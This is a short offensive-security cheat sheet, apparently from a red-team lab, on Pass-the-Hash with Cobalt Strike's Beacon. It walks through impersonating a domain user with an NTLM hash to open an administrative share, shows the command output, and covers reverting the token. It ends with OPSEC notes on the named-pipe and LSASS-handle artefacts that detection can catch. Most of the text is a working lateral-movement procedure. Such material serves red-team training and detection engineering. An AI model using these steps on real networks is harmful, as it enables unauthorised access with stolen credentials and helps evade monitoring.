# Pass The Hash (PTH)

##

## Pass The Hash

#### <mark style="color:red;">Note</mark>: Requires Elevated Privileges

## Cobalt Strike

Beacon has a built-in `pth` command that runs mimikatz in the background.&#x20;

#### We'll first attempt to access resources we don't have permission to

```powershell
beacon> getuid
[*] You are DEV\sam (admin)

beacon> ls \\internal-website.rotta.dev\c$
[-] could not open \\internal-website.rotta.dev\c$\*: 5 - ERROR_ACCESS_DENIED
```

### Execute PTH with NTLM hash

We can execute Pass-The-Hash like so:

```powershell
beacon> pth DEV\robert 2B576ACBE6BCFDA7294D6BD18041B8FE
...
```

#### List resources as impersonated user

```powershell
beacon> ls \\internal-website.rotta.dev\c$
[*] Listing: \\internal-website.rotta.dev\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2024 11:30:11   $Recycle.Bin
          dir     08/10/2024 11:45:28   $WinREAgent
```

### Drop Impersonation

Use `rev2self` to drop impersonation.

```powershell
beacon> rev2self
[*] Tasked beacon to revert token
```

## OPSEC

When running the `pth` command, a named pipe command is run that looks like:

```powershell
program	: C:\Windows\system32\cmd.exe /c echo 71fb38e2d65 > \\.\pipe\675b08
```

<mark style="color:red;">**Note**</mark>:  This can be found via the "Suspicious Named Pipe Impersonation" search, which queries process events where the arguments contain "echo", ">" and "\\.\pipe".



<mark style="color:red;">**Note**</mark>: Mimikatz also opens a suspicious handle to LSASS.&#x20;

PROCESS\_QUERY\_LIMITED\_INFORMATION (0x1000), PROCESS\_VM\_WRITE (0x0020), PROCESS\_VM\_READ (0x0010) and PROCESS\_VM\_OPERATION (0x0008).
